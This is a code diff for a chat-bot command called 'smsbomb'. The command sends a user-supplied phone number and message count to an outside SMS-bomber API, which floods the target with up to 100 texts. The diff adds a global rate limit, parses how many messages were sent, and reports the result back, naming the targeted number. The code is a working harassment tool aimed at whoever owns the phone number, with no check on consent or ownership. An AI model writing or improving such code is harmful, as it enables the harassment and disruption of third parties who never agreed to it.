@@ -5,6 +5,12 @@ const { sendMessage } = require('../handles/sendMessage');
 const userCooldowns = new Map();
 const COOLDOWN_TIME = 180000; // 3 minutes
 
+// Global rate limit tracking
+const globalRateLimit = {
+    count: 0,
+    resetTime: Date.now() + 60000 // 1 minute
+};
+
 module.exports = {
     name: ['smsbomb', 'smsbomber', 'bomb'],
     usage: 'smsbomb [phone] | [amount]',
@@ -15,10 +21,25 @@ module.exports = {
     cooldown: 180,
 
     async execute(senderId, args, token, event) {
-        // Check cooldown first
+        // Check global rate limit
+        const now = Date.now();
+        if (now > globalRateLimit.resetTime) {
+            globalRateLimit.count = 0;
+            globalRateLimit.resetTime = now + 60000;
+        }
+        
+        if (globalRateLimit.count >= 3) {
+            const remainingSeconds = Math.ceil((globalRateLimit.resetTime - now) / 1000);
+            await sendMessage(senderId, {
+                text: `Global Rate Limit Reached\n\nPlease wait ${remainingSeconds} seconds before using this command again.\n\nThis is to prevent abuse of the SMS bombing service.`
+            }, token);
+            return;
+        }
+
+        // Check user cooldown
         const lastUsed = userCooldowns.get(senderId);
-        if (lastUsed && (Date.now() - lastUsed) < COOLDOWN_TIME) {
-            const remainingSeconds = Math.ceil((COOLDOWN_TIME - (Date.now() - lastUsed)) / 1000);
+        if (lastUsed && (now - lastUsed) < COOLDOWN_TIME) {
+            const remainingSeconds = Math.ceil((COOLDOWN_TIME - (now - lastUsed)) / 1000);
             const minutes = Math.floor(remainingSeconds / 60);
             const seconds = remainingSeconds % 60;
             
@@ -38,7 +59,7 @@ module.exports = {
         // Check if phone number and amount are provided
         if (args.length < 2) {
             await sendMessage(senderId, { 
-                text: `Usage:\nsmsbomb 09123456789 | 10\n\nAmount Range: 1-100 messages\nCooldown: 3 minutes`
+                text: `SMS Bomber Tool\n\nUsage:\nsmsbomb [phone] | [amount]\n\nExample:\nsmsbomb 09123456789 | 10\n\nAmount Range: 1-100 messages\nCooldown: 3 minutes\nGlobal Limit: 3 requests per minute`
             }, token);
             return;
         }
@@ -69,7 +90,10 @@ module.exports = {
             return;
         }
 
-        await sendMessage(senderId, { text: `Starting SMS bombing to ${phone}...` }, token);
+        // Increment global rate limit
+        globalRateLimit.count++;
+
+        await sendMessage(senderId, { text: `Starting SMS bombing to ${phone} with ${amount} messages...` }, token);
 
         try {
             const response = await axios.get('https://haji-mix-api.gleeze.com/api/smsbomber', {
@@ -81,34 +105,83 @@ module.exports = {
                 timeout: 30000
             });
 
-            if (response.data && response.data.success) {
+            console.log('Full API Response:', JSON.stringify(response.data, null, 2));
+
+            let successCount = 0;
+            let failedCount = 0;
+            
+            if (response.data) {
+                // Extract success count
+                if (response.data.success_count !== undefined) {
+                    successCount = parseInt(response.data.success_count) || 0;
+                } else if (response.data.sent !== undefined) {
+                    successCount = parseInt(response.data.sent) || 0;
+                } else if (response.data.total !== undefined) {
+                    successCount = parseInt(response.data.total) || 0;
+                } else if (response.data.count !== undefined) {
+                    successCount = parseInt(response.data.count) || 0;
+                } else if (response.data.success !== undefined) {
+                    successCount = parseInt(response.data.success) || 0;
+                } else if (response.data.message) {
+                    const countMatch = response.data.message.match(/(\d+)/);
+                    if (countMatch) {
+                        successCount = parseInt(countMatch[1]) || amount;
+                    } else {
+                        successCount = amount;
+                    }
+                } else {
+                    successCount = amount;
+                }
+
+                // Extract failed count
+                if (response.data.failed_count !== undefined) {
+                    failedCount = parseInt(response.data.failed_count) || 0;
+                } else if (response.data.failed !== undefined) {
+                    failedCount = parseInt(response.data.failed) || 0;
+                }
+
+                // Ensure successCount does not exceed amount
+                if (successCount > amount) {
+                    successCount = amount;
+                }
+
+                // Set user cooldown
                 userCooldowns.set(senderId, Date.now());
-                
-                // Extract success and failed counts from response
-                const successCount = response.data.success_count || response.data.sent || amount;
-                const failedCount = response.data.failed_count || response.data.failed || 0;
-                const totalAttempted = successCount + failedCount;
-                
+
                 let message = `SMS Bombing Complete\n\n`;
                 message += `Target: ${phone}\n`;
-                message += `Attempted: ${totalAttempted} messages\n\n`;
+                message += `Requested: ${amount} messages\n`;
                 message += `Sent Successfully: ${successCount}\n`;
-                message += `Failed to Send: ${failedCount}\n\n`;
-                message += `Next use available in 3 minutes`;
-                
+                message += `Failed to Send: ${failedCount}\n`;
+
+                if (successCount !== amount) {
+                    message += `\nNote: Only ${successCount} out of ${amount} messages were sent.`;
+                }
+
+                message += `\n\nNext use available in 3 minutes\nGlobal Limit: ${globalRateLimit.count}/3 per minute`;
+
                 await sendMessage(senderId, { text: message }, token);
-                console.log(`SMS bomb sent to ${phone} (${successCount}/${totalAttempted}) by user ${senderId}`);
+                
+                console.log(`SMS bomb: Requested ${amount}, Sent ${successCount}, Failed ${failedCount} to ${phone} by user ${senderId}`);
+                
             } else {
                 await sendMessage(senderId, { 
                     text: `Failed to Start SMS Bombing\n\nError: ${response.data?.message || 'Unknown error'}\n\nPlease check the phone number and try again later.`
                 }, token);
             }
+            
         } catch (error) {
             console.error('SMS Bomber Error:', error);
             
             let errorMessage = `Error Occurred\n\n`;
             
-            if (error.code === 'ECONNABORTED') {
+            if (error.response?.status === 429) {
+                errorMessage += `Rate limit exceeded. Please wait a few minutes before trying again.\n\nThe SMS bombing service has a limit of 3 requests per minute.`;
+            } else if (error.response?.status === 500) {
+                errorMessage += `Server error. Please try again later.`;
+            } else if (error.response?.status === 400) {
+                errorMessage += `Invalid phone number or amount. Please check your input.`;
+            } else if (error.code === 'ECONNABORTED') {
                 errorMessage += `Connection timeout. The server is taking too long to respond.`;
             } else if (error.response) {
                 errorMessage += `API Error: ${error.response.status}\nMessage: ${error.response.data?.message || 'Unknown error'}`;
@@ -118,7 +191,7 @@ module.exports = {
                 errorMessage += `${error.message}`;
             }
             
-            errorMessage += `\n\nPlease check the phone number format and try again.\nExample: smsbomb 09123456789 | 10`;
+            errorMessage += `\n\nPlease wait a few minutes and try again.\nExample: smsbomb 09123456789 | 10`;
             
             await sendMessage(senderId, { text: errorMessage }, token);
         }
